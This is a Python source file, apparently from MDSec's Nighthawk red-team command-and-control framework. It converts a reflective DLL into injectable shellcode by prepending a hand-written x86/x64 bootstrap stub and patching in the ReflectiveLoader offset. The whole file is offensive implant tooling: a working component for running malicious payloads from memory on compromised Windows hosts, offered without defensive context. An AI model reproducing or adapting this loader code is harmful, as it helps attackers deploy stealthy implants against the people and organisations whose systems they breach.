# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

import struct
import gzip
import StringIO
import itertools

from helpers import is_pe_arch_x64, write_le_dword

from rdll_properties_x86 import X86RDLLProperties
from rdll_properties_x64 import X64RDLLProperties

class ShellcodeGenerator(object):
	MACDADDY_X64 = (
			"\xE8\x00\x00\x00\x00"			# call $0
			"\x58"                          # pop rax
			"\x48\x05\x43\x43\x43\x43"      # add rax,41414141 <ReflectiveLoader>
			"\xFF\xE0"                      # jmp rax
		)

	MACDADDY_X86 = (
			"\xE8\x00\x00\x00\x00"			# call $0
			"\x58"							# pop eax
			"\x05\x43\x43\x43\x43"			# add eax,41414141 <ReflectiveLoader>
			"\xFF\xE0"						# jmp eax
		)

	@staticmethod
	def convert_rdll_to_uncompressed_shellcode(rdll_buf, reflective_export_name):
		is_x64 = is_pe_arch_x64(rdll_buf)

		if is_x64:
			mac_daddy = ShellcodeGenerator.MACDADDY_X64 + rdll_buf
			loader_export_fo = X64RDLLProperties.get_reflective_loader_offset()
			mac_daddy = write_le_dword(mac_daddy, 8, loader_export_fo + len(ShellcodeGenerator.MACDADDY_X64) - 5)
			return mac_daddy
		else:
			mac_daddy = ShellcodeGenerator.MACDADDY_X86 + rdll_buf
			loader_export_fo = X86RDLLProperties.get_reflective_loader_offset()
			mac_daddy = write_le_dword(mac_daddy, 7, loader_export_fo + len(ShellcodeGenerator.MACDADDY_X86) - 5)
			return mac_daddy
		return
